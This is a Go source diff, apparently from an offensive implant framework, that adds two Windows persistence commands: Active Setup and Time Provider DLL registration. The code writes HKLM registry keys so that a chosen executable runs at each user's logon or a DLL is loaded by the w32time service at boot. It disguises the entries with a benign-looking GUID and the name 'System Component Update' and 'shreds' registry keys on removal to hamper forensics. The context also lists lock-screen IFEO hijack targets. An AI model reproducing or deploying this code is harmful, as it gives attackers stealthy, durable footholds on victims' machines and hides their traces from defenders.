@@ -141,6 +141,115 @@ func persistScreensaver(args persistArgs) structs.CommandResult {
 	}
 }
 
+// persistActiveSetup installs/removes Active Setup persistence (T1547.014).
+// Active Setup runs StubPath commands once per user at first logon. Survives
+// profile resets. Requires admin to write to HKLM.
+func persistActiveSetup(args persistArgs) structs.CommandResult {
+	if args.Name == "" {
+		args.Name = "{A9E1B7F2-3D4C-5E6F-7A8B-9C0D1E2F3A4B}" // benign-looking GUID
+	}
+
+	activeSetupBase := `SOFTWARE\Microsoft\Active Setup\Installed Components`
+	keyPath := activeSetupBase + `\` + args.Name
+
+	switch strings.ToLower(args.Action) {
+	case "install":
+		if args.Path == "" {
+			exe, err := os.Executable()
+			if err != nil {
+				return errorf("Error getting executable path: %v", err)
+			}
+			args.Path = exe
+		}
+
+		key, _, err := registry.CreateKey(registry.LOCAL_MACHINE, keyPath, registry.SET_VALUE)
+		if err != nil {
+			return errorf("Error creating HKLM\\%s: %v (admin required)", keyPath, err)
+		}
+		defer key.Close()
+
+		// Set display name (appears in registry as default value)
+		_ = key.SetStringValue("", "System Component Update")
+
+		// Set StubPath (the command that runs at user logon)
+		if err := key.SetStringValue("StubPath", args.Path); err != nil {
+			return errorf("Error setting StubPath: %v", err)
+		}
+
+		// Set Version to force re-execution (increment to re-trigger for existing users)
+		if err := key.SetStringValue("Version", "1,0,0,1"); err != nil {
+			return errorf("Error setting Version: %v", err)
+		}
+
+		return successf("Installed Active Setup persistence:\n  Key:       HKLM\\%s\n  StubPath:  %s\n  Version:   1,0,0,1\n  Trigger:   Runs once per user at first logon\n  Note:      Requires admin. Survives profile resets. To re-trigger, increment Version.", keyPath, args.Path)
+
+	case "remove":
+		// Shred and delete the Active Setup entry
+		shredRegistryKey(registry.LOCAL_MACHINE, keyPath)
+
+		return successf("Removed Active Setup persistence (shredded):\n  Key: HKLM\\%s", keyPath)
+
+	default:
+		return errorf("Error: unknown action '%s'. Use: install or remove", args.Action)
+	}
+}
+
+// --- Time Provider Persistence (T1547.003) ---
+
+const timeProviderRegBase = `SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders`
+
+// persistTimeProvider installs/removes Time Provider DLL persistence (T1547.003).
+// Registers a DLL as a Windows Time Provider, loaded by w32time service at boot.
+func persistTimeProvider(args persistArgs) structs.CommandResult {
+	if args.Name == "" {
+		args.Name = "NtpClientExt"
+	}
+
+	regPath := timeProviderRegBase + `\` + args.Name
+
+	switch strings.ToLower(args.Action) {
+	case "install":
+		if args.Path == "" {
+			return errorResult("Error: path is required (DLL to register as time provider)")
+		}
+
+		// Verify DLL exists
+		if _, err := os.Stat(args.Path); err != nil {
+			return errorf("Error: DLL not found: %v", err)
+		}
+
+		key, _, err := registry.CreateKey(registry.LOCAL_MACHINE, regPath, registry.SET_VALUE)
+		if err != nil {
+			return errorf("Error creating HKLM\\%s: %v (admin required)", regPath, err)
+		}
+		defer key.Close()
+
+		// DllName is the path to the time provider DLL
+		if err := key.SetStringValue("DllName", args.Path); err != nil {
+			return errorf("Error setting DllName: %v", err)
+		}
+		// Enabled = 1 to activate the provider
+		if err := key.SetDWordValue("Enabled", 1); err != nil {
+			return errorf("Error setting Enabled: %v", err)
+		}
+		// InputProvider = 1 (this is an input time provider)
+		if err := key.SetDWordValue("InputProvider", 1); err != nil {
+			return errorf("Error setting InputProvider: %v", err)
+		}
+
+		return successf("Installed Time Provider persistence:\n  Key:       HKLM\\%s\n  DllName:   %s\n  Enabled:   1\n  Trigger:   Loaded by w32time service (svchost.exe) at boot\n  Note:      Requires admin. Restart w32time to load immediately:\n             net stop w32time && net start w32time", regPath, args.Path)
+
+	case "remove":
+		// Shred registry values before deletion
+		shredRegistryKey(registry.LOCAL_MACHINE, regPath)
+
+		return successf("Removed Time Provider persistence (shredded):\n  Key: HKLM\\%s", regPath)
+
+	default:
+		return errorf("Error: unknown action '%s'. Use: install or remove", args.Action)
+	}
+}
+
 // ifeoTargets are common IFEO targets accessible from the Windows lock screen.
 var ifeoTargets = [][2]string{
 	{"sethc.exe", "Sticky Keys (5x Shift at lock screen)"},
